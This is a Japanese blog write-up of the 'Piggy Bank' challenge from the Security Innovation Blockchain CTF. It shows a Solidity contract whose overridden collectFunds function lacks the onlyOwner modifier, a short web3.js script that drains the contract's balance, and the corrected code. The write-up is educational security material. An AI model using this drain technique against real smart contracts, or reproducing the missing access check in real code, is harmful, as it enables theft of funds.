+++
title = "[Security Innovation Blockchain CTF] Piggy Bank"
date = "2022-06-04"
tags = [
    "security",
    "ctf",
]
draft = true
+++

#### 概要

[Security Innovation Blockchain CTF](https://blockchain-ctf.securityinnovation.com/)

Security Innovationという企業が開催している、常設のCTFがあります。
今回は、[Piggy Bank](https://blockchain-ctf.securityinnovation.com/#/game/1)という問題を解きました。

#### 問題

貯金箱のようなアプリで、ownerのみが資金を出し入れできる実装になっています。

<img src=./dapps.png><br>

#### ソースコードを読む

`PiggyBank`というコントラクトが本体の実装になっており、`CharliesPiggyBank`はそれを継承したアプリです。

`CharliesPiggyBank`は、`collectFunds`という資金引き出し用の関数のみをoverrideしています。

`PiggyBank`には`onlyOwner`というmodifierが付いているものの、`CharliesPiggyBank`でoverrideされた関数では、modifierが付与されていません。

そのため、継承先のアプリでは`collectFunds`が誰でも呼び出し可能になっているようです。

```solidity
pragma solidity 0.4.24;

import "../CtfFramework.sol";
import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract PiggyBank is CtfFramework{

    using SafeMath for uint256;

    uint256 public piggyBalance;
    string public name;
    address public owner;

    constructor(address _ctfLauncher, address _player, string _name) public payable
        CtfFramework(_ctfLauncher, _player)
    {
        name=_name;
        owner=msg.sender;
        piggyBalance=piggyBalance.add(msg.value);
    }

    function() external payable ctf{
        piggyBalance=piggyBalance.add(msg.value);
    }


    modifier onlyOwner(){
        require(msg.sender == owner, "Unauthorized: Not Owner");
        _;
    }

    function withdraw(uint256 amount) internal{
        piggyBalance = piggyBalance.sub(amount);
        msg.sender.transfer(amount);
    }

    function collectFunds(uint256 amount) public onlyOwner ctf{
        require(amount<=piggyBalance, "Insufficient Funds in Contract");
        withdraw(amount);
    }

}

contract CharliesPiggyBank is PiggyBank{

    uint256 public withdrawlCount;

    constructor(address _ctfLauncher, address _player) public payable
        PiggyBank(_ctfLauncher, _player, "Charlie") 
    {
        withdrawlCount = 0;
    }

    function collectFunds(uint256 amount) public ctf{
        require(amount<=piggyBalance, "Insufficient Funds in Contract");
        withdrawlCount = withdrawlCount.add(1);
        withdraw(amount);
    }
}
```

#### エクスプロイト

```solidity
const Web3 = require('web3')
const HDWalletProvider = require("@truffle/hdwallet-provider")
const fs = require('fs');

require('dotenv').config()

const web3 = new Web3(new HDWalletProvider(process.env.PRIVATE_KEY, process.env.PROVIDER_URL))
const abi = JSON.parse(fs.readFileSync('./src/abi.json'))
const contract = new web3.eth.Contract(abi, '0x27e03071617a155c88603ffc322262c47b209d03')
contract.methods.piggyBalance().call().then(wei => {
  const option = {from: '0xd7544D522B75347b48917649ebc5D334b3D43445'}
  contract.methods.collectFunds(wei).send(option)
})
```

#### どう実装されているべきか

modifierはoverrideされた関数には継承されないため、overrideした関数にも正しいmodifierを付与する必要があります。

```solidity
    function collectFunds(uint256 amount) public onlyOwner ctf{
        require(amount<=piggyBalance, "Insufficient Funds in Contract");
        withdrawlCount = withdrawlCount.add(1);
        withdraw(amount);
    }
```
